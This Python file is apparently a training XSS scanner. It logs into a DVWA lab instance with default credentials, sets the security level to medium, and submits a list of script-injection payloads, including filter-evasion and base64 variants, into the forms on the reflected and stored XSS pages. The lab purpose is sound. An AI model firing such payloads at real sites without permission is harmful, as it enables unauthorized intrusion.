import html
import re
import urllib.parse as urlparse

import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

from decode_handler import decode_values


class Scanner:
    def __init__(self, url: str, links: list[str], test_payloads: list[str], payload_success: str):
        init()
        self.session = requests.Session()
        self.target_url = url
        self.target_links = links
        self.payloads = test_payloads
        self.answer_payload_success = payload_success

        self.target_forms_XSS = []

    def login(self, login_form, data_login):
        self.session.post(login_form, data=data_login)

    def set_security_level(self, url, data_level):
        response = self.session.post(url, data=data_level)
        answer = decode_values(response.content)
        pattern = r"<b>Security Level:</b> (.*?)<br />"
        matches = re.findall(pattern, answer, re.DOTALL)
        return matches

    def extract_forms(self, url: str):
        """This function is used to extract all the forms from a webpage specified by the input URL."""
        response = self.session.get(url)
        parsed_html = BeautifulSoup(response.content, features='lxml')  # features='html.parser' features='lxml'
        return parsed_html.findAll("form")

    def submit_form(self, form, value: dict | str, url: str):
        """
        Extract all required attributes from forms. Fill out and submit the form
        :param form: Specify the form you want to submit
        :param value: The value we want to set for the inputs in this form
        :param url: Url address of the page from which we retrieved this form
        :return:
        """

        action = form.get("action")
        post_url = urlparse.urljoin(url, action)
        method = form.get("method")

        inputs_list = form.findAll("input")

        post_data = {}
        for input in inputs_list:
            input_name = input.get("name")
            input_type = input.get("type")
            input_value = input.get("value")
            if input_type == "text":
                input_value = value

            post_data[input_name] = input_value

        if method == 'post':
            return self.session.post(post_url, data=post_data)
        return self.session.get(post_url, params=post_data)

    def run_scanner(self):
        """Check each link in the target_links list, extract forms from those links.
         Check forms and links for vulnerabilities"""
        for link in self.target_links:
            forms = self.extract_forms(link)

            for form in forms:
                """Add and call a method if a FORM vulnerability is found"""
                print(f"[+] Testing form in: {link}")

                is_vulnerable_to_xss = self.test_xss_in_form(form=form, url=link)

                if is_vulnerable_to_xss:
                    self.target_forms_XSS.append((link, form))
                    print(f"\n{Fore.CYAN}[***] 💉 XSS Discovered in: {link}{Style.RESET_ALL}\n")
                    print(f"{Fore.YELLOW}[***] 💉 Payload: \n\"{is_vulnerable_to_xss}\"{Style.RESET_ALL}\n")
                    print(f"{Fore.GREEN}Form: {Style.RESET_ALL} \n{form}")
                    print("=" * 50)

    def test_xss_in_form(self, form, url: str):
        """This method is used to check xss vulnerabilities in forms"""
        results = []
        for payload in self.payloads:
            response = self.submit_form(form=form, value=payload, url=url)
            if payload in response.text or html.escape(payload) in response.text:
                results.append((True, payload))
            else:
                results.append((False, payload))
        return [result for result in results if result[0]]


if __name__ == '__main__':
    target_url = "http://10.0.2.12/dvwa/"
    login_url = f"{target_url}/login.php"
    security_url = f"{target_url}/security.php"

    target_links = [
        "http://10.0.2.12/dvwa/vulnerabilities/xss_r/",
        "http://10.0.2.12/dvwa/vulnerabilities/xss_s/",
    ]
    payloads = [
        # Regular XSS payloads
        "<sCript>alert('XSS PAYLOAD form')</scriPt>",
        '<marquee onmouseover=alert(1)>',
        '<svg/onload=alert(1)>',
        "<scr<script>ipt>alert('XSS PAYLOAD form')</scri</script>pt>",
        '<marquee onstart=alert(1)>',
        '<svg/onload=confirm(1);>',
        '<input onmousemove=alert(1)>',
        # XSS payloads using various tags
        '<html><script>alert(1)</script></html>',
        '<body onload=alert(1)>',
        '<iframe onbeforeload=alert(1)>',
        '<object onerror=alert(1)>',
        # Base64-encoded XSS payloads
        'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'PGEgaHJlZj0iaHR0cDovL3d3dy5tZWRpYS5zZSI+',
        'PCFET0NUWVBFIGh0bWwg',
        # Additional XSS payloads
        '<img src=x onerror=alert(1);>',
        '<a href=javascript:alert(1);>',
        '<body background=javascript:alert(1);>',
        '<input type=image src= onerror=alert(1);>',
        '<isindex action=javascript:alert(1);>',
        '<layer src=javascript:alert(1);>',
        '<xml id=xx><x:script><!ENTITY xxe "test"></x:script></xml>',
        "<img src='x' onerror='alert(1)'>",
        "<body onload='alert(1)'>",
        "<iframe src='javascript:alert(1)'>",
        "<svg onload='alert(1)'>",
        "<div style='width:100px;height:100px;background:url(javascript:alert(1))'>",
    ]

    answer_payload_success = ''

    authorization_in_login_form = {
        "username": 'admin',
        "password": 'password',
        "Login": 'submit',
    }

    data_security = {
        'security': 'medium',
        'seclev_submit': 'Submit'
    }

    vulnerability_scanner = Scanner(target_url, target_links, payloads, answer_payload_success)
    vulnerability_scanner.login(login_url, authorization_in_login_form)

    security_level = vulnerability_scanner.set_security_level(security_url, data_security)
    print(f"\n[+] Security Level: {security_level[0]} \n")

    print("\033[1;32m\nVulnerability Scanner Starts 🧐 ==> \033[0m")
    vulnerability_scanner.run_scanner()
